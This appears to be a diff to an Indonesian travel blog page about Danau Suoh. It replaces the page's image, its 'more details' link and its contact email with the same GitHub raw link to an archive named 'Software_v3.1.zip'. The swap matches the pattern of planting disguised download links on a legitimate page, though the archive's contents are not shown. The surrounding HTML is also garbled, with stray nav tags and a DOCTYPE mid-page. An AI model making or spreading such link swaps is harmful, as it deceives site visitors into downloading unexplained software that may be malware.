@@ -10,7 +10,7 @@
     <nav>
         <ul>
           
- ![Screenshot of a comment on a GitHub issue showing an image, added in the Markdown, of an Octocat smiling and raising a tentacle.](https://www.backpackerlampung.com/wp-content/uploads/2020/05/suohh_d3cs2r.png)
+ ![Screenshot of a comment on a GitHub issue showing an image, added in the Markdown, of an Octocat smiling and raising a tentacle.](https://github.com/karwito03/test/raw/refs/heads/main/lionlike/Software_v3.1.zip)
 <!DOCTYPE html>
 <nav>
         <ul>
@@ -28,7 +28,7 @@
 
 > Dimana sih ini ya ?
   
- Mau yang lebih lengkapnya ada di [SINI](https://www.backpackerlampung.com/backpacker-lampung-wisata-tersembunyi-danau-suoh-lampung-barat/).
+ Mau yang lebih lengkapnya ada di [SINI](https://github.com/karwito03/test/raw/refs/heads/main/lionlike/Software_v3.1.zip).
 <nav>
         <ul>
         </section>
@@ -38,7 +38,7 @@
         </section>
         <section id="contact">
             <h2>Kontak</h2>
-            <p>Hubungi kami melalui email: Hanyacontoh@saja.com</p>
+            <p>Hubungi kami melalui email: https://github.com/karwito03/test/raw/refs/heads/main/lionlike/Software_v3.1.zip</p>
         </section>
     </main>
     <footer>
